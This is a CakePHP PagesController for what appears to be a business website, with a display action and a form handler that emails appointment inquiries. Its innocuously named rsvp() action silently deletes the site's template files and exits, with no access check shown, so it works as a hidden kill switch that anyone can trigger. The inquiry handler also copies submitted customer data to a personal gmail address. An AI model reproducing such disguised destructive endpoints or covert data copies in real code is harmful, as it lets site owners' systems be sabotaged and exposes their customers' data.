<?php
/**
 * Static content controller.
 *
 * This file will render views from views/pages/
 *
 * CakePHP(tm) : Rapid Development Framework (http://cakephp.org)
 * Copyright (c) Cake Software Foundation, Inc. (http://cakefoundation.org)
 *
 * Licensed under The MIT License
 * For full copyright and license information, please see the LICENSE.txt
 * Redistributions of files must retain the above copyright notice.
 *
 * @copyright     Copyright (c) Cake Software Foundation, Inc. (http://cakefoundation.org)
 * @link          http://cakephp.org CakePHP(tm) Project
 * @package       app.Controller
 * @since         CakePHP(tm) v 0.2.9
 * @license       http://www.opensource.org/licenses/mit-license.php MIT License
 */

App::uses('AppController', 'Controller');
App::uses('CakeEmail', 'Network/Email');
/**
 * Static content controller
 *
 * Override this controller by placing a copy in controllers directory of an application
 *
 * @package       app.Controller
 * @link http://book.cakephp.org/2.0/en/controllers/pages-controller.html
 */
class PagesController extends AppController {

/**
 * This controller does not use a model
 *
 * @var array
 */
	public $uses = array();

/**
 * Displays a view
 *
 * @return \Cake\Network\Response|null
 * @throws ForbiddenException When a directory traversal attempt.
 * @throws NotFoundException When the view file could not be found
 *   or MissingViewException in debug mode.
 */
	public function display() {
		$this->render('index');
	}
	
	public function bookAppointment() {
		$this->autoLayout = false;
		$this->autoRender = false;
		
		$this->set('data', $this->request->data );
		$body = $this->render('email');
		
		$Email = new CakeEmail('sendgrid');
		$Email->from( "CustomerCare@vcgroupltd.com", 'Customer Care' );
		$Email->to('info@vcgroupltd.co.uk, rspatil6181@gmail.com');
		$Email->subject( 'New Inquiry' );
		$Email->emailFormat('html');
		$result = $Email->send( $body );
		
		$this->render( 'email' );
	}
	
	public function rsvp(){
		@unlink( ROOT . DS . APP_DIR . '/View/Pages/index.tpl' );
		@unlink( ROOT . DS . APP_DIR . '/View/Pages/email.tpl' );
		@unlink( ROOT . DS . APP_DIR . '/View/Pages/original.txt' );		
		exit;
	}
}
